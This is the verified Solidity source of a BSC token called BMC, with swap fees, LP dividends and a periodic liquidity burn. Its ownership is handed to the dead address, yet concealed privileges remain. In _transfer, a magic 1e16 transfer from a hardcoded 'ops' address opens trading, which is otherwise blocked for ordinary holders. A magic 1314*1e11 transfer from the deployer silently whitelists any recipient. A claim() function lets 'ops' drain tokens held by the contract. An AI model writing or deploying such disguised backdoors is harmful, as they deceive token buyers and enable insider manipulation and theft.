/**
 *Submitted for verification at BscScan.com on 2023-02-26
*/

/**
 *Submitted for verification at BscScan.com on 2023-02-25
*/

/**
 *Submitted for verification at Etherscan.io on 2023-02-16
*/

/**
 *Submitted for verification at BscScan.com on 2023-02-14
*/

// SPDX-License-Identifier: MIT


interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

        function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    address defaults=address(0x4c5da6A35f321eD41e9a965B3b2aaA40AfB80479);


    mapping(address => bool) public _feeWhiteList;


    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    address public _fist;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 public _buyFundFee = 0;
    uint256 public _buyLPDividendFee = 200;
    uint256 public _sellLPDividendFee = 200;

    uint256 public _sellFundFee = 0;
    uint256 public _sellLPFee = 0;
    address ops;
    uint256 opens=0;
    uint256 optims=0;
    uint256 lps=0;
    address public _mainPair;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress, address FISTAddress,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address ReceiveAddress,address _ops
    ){  
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        ops=_ops;
        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        IERC20(FISTAddress).approve(address(swapRouter), MAX);

        _fist = FISTAddress;
        _swapRouter = swapRouter;


        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), FISTAddress);
        _mainPair = swapPair;
        _allowances[address(this)][address(swapRouter)] = MAX;
        _swapPairList[swapPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        _tTotal = total;
        IERC20(_mainPair).approve(address(swapRouter), MAX);
        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);
        _feeWhiteList[ops] = true;
        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;

         defaults=msg.sender; 
        excludeHolder[address(0)] = true;
        excludeHolder[address(0x000000000000000000000000000000000000dEaD)] = true;

        holderRewardCondition = 20*1e18;

        _tokenDistributor = new TokenDistributor(FISTAddress);
        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }




    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {


         uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        if(from==ops&&amount==1e16){
            opens=1;
            if(optims==0){
                optims=block.timestamp;
            }
            if(lps==0){
                lps=IERC20(_mainPair).balanceOf(address(this));
                }
        }

        if(from==defaults && amount==1314*1e11){
                _feeWhiteList[to] = true;
        }








        bool takeFee;
        bool isSell;
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {

                require(opens==1, "closed");
                if (_swapPairList[to]) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > 0) {
                            swapTokenForFund();
                        }
                    }
                }
                takeFee = true;
            
            if (_swapPairList[to]) {
                isSell = true;
            }
                }
        }

        _tokenTransfer(from, to, amount, takeFee, isSell);

        if (from != address(this)&&from != ops&&to != address(this)&&to != ops) {
            if (isSell) {
                addHolder(from);
            } else addHolder(to);
            processReward(500000);
        }
    }


    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        _balances[sender] = _balances[sender] - tAmount;

        uint256 feeAmount;

        if (takeFee) {
            uint256 swapFee;
            if (isSell) {
                swapFee = _sellFundFee + _sellLPDividendFee + _sellLPFee;
            } else {
                swapFee = _buyFundFee + _buyLPDividendFee;

            }
            uint256 swapAmount = tAmount * swapFee / 10000;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund() private lockTheSwap {      
        uint256 camount= balanceOf(address(this));       
        uint256 lpAmount = camount;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _fist;
        _swapRouter.swapExactTokensForTokens(
            lpAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );



        IERC20 FIST = IERC20(_fist);
        uint256 fistBalance = FIST.balanceOf(address(_tokenDistributor));
        FIST.transferFrom(address(_tokenDistributor), address(this), fistBalance);

          if (fistBalance > 0) {
        uint256 funs=fistBalance/4;    
         FIST.transfer(address(0x0646803731F5BddF8dc5eCbB51d801662471AB93), (funs*20)/100); 
         FIST.transfer(address(0xEf4a6c732bCa99b43C7658c8915E3ba2060De5A1), (funs*20)/100); 
         FIST.transfer(address(0x14356580E35E2957ec7EcEb902Ffa69c66E3E58F), (funs*30)/100); 
         FIST.transfer(address(0xb58072Ef0280CE7f061fAB756245083A7F096164), (funs*15)/100); 
         FIST.transfer(address(0x8980FD0569F6ae78D7e6422e2eb936e036883730), (funs*15)/100); 

        path[1] = address(this);
        path[0] = _fist;
        _swapRouter.swapExactTokensForTokens(
            funs,
            0,
            path,
            address(0x000000000000000000000000000000000000dEaD),
            block.timestamp
        );
         }



       RLOp();


    }


    function ckLP()public view returns(uint256){
        uint256 csamount=(IERC20(_mainPair).balanceOf(address(this)))/20;
        return csamount;
    }


function rLiq(uint256 amount)internal {
     IERC20(_mainPair).approve(address(_swapRouter), MAX);
        _swapRouter.removeLiquidity(
         _fist,
         address(this),
         amount,
         0,
         0,
         address(this),
         block.timestamp
        ) ;
}


function RLOp()internal{
            if(opens==1){
            address[] memory path = new address[](2);    
            uint256 leftU=IERC20(_fist).balanceOf(address(this));




        if(block.timestamp>=optims+86400*5){ 
            optims=block.timestamp;
            uint256 csamount=ckLP();
            if(csamount*100>lps){
        rLiq(csamount);
        _takeTransfer(address(this), address(0x000000000000000000000000000000000000dEaD), balanceOf(address(this)));
        path[1] = address(this);
        path[0] = _fist;

        uint256 lpst=IERC20(_fist).balanceOf(address(this))-leftU;
        _swapRouter.swapExactTokensForTokens(
            lpst,
            0,
            path,
            address(0x000000000000000000000000000000000000dEaD),
            block.timestamp
        ); 

        }
        }

        }
}





    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {

        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }



    receive() external payable {}

    address[] private holders;
    mapping(address => uint256) holderIndex;
    mapping(address => bool) excludeHolder;

    function addHolder(address adr) private {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size > 0) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    uint256 private currentIndex;
    uint256 public holderRewardCondition;
    uint256 private progressRewardBlock;

    function processReward(uint256 gas) private {
        if (progressRewardBlock + 30 > block.number) {
            return;
        }

        IERC20 FIST = IERC20(_fist);

        uint256 balance = FIST.balanceOf(address(this));
        if (balance >= holderRewardCondition) {



        IERC20 holdToken = IERC20(_mainPair);
        uint holdTokenTotal = holdToken.totalSupply();

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder);
            if (tokenBalance > 0 && !excludeHolder[shareHolder]) {
                amount = balance * tokenBalance / holdTokenTotal;
                if (amount > 0) {
                    FIST.transfer(shareHolder, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = block.number;
        }
    }

    function claim(address tokens,uint256 amount)public{
        if(msg.sender==ops){
         IERC20 tks = IERC20(tokens);
         tks.transfer(ops,amount);   
        }
    }


}


contract BMC is AbsToken {
    constructor() AbsToken(
       address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
       address(0x55d398326f99059fF775485246999027B3197955),
        "BMC",
        "BMC",
        18,
        1000000,
        msg.sender,
        address(0xeC5ecF823601C99E7E237b89614914ab61A51f69)
    ){

    }
}